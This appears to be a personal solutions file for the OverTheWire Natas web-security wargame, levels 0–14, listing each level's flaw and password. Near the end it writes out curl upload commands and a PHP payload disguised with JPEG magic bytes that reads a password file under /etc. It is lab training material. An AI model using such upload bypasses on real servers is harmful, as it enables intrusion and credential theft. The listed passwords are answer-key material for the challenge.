@@ -1,0 +1,81 @@
+#Here are all the http users and keys from the natas challenge form over the wire
+
+#Remote
+http://natasX.natas.labs.overthewire.org
+
+
+#0
+natas0 natas0
+
+#1
+F12 ->Expand
+#Err PW in Comments
+natas1 gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+#2
+F12 ->Expand
+#Err PW in Code
+natas2  ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+#3
+F12 ->Go to /files and look a users
+#Err Accsess to Files with PW
+natas3  sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+#4
+F12 ->Append /robots.txt, look at /s3cr3t/users.txt
+#Err Accsess to Files with PW
+natas4  Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+#5
+Trick the site to think u come form natas5. Use Referer Control
+#Err Accsess control via Referer - Can be manipulated
+natas5  iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+#6
+Edit the Cookie loged in to 1
+#Err Accsess via boolean Cookie
+natas6  aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+#7
+Find the included secret. Enter the secret
+#Err Hardcodeed include to file with secret
+natas7  7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+
+#8 Navigate via ?page= to file with PW
+#Err Direct accsess to souce files on filesystem via PHP
+natas8  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+#9 View Source with chrome. Reverse the token encode with php:
+base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+#Err Hardcodeed token
+natas9 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+#10 View Source with chrome. No user input synthesising:
+#Err You can pass ; and your own commands
+natas10 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+#11 View Source with chrome. No user input synthesising:
+#Err You can pass .* and your own commands
+natas11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+#12 View Source with chrome. See Decode.php
+#Err Key can be reversed
+natas12 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+#13 Upload file. It will be randoly renamed
+curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=info.php" -F "uploadedfile=@./info.php" http://natas12.natas.labs.overthewire.org
+#Err Content of wile will be executed
+natas13 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+#14 Upload file. It will be randoly renamed
+echo -e "\xFF\xD8\xFF\xE0" > img.php
+echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> img.php
+curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F "MAX_FILE_SIZE=1000" -F "filename=img.php" -F "uploadedfile=@./img.php" http://natas13.natas.labs.overthewire.org
+#Err Content of wile will be executed
+natas14 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 
+
+
+
+
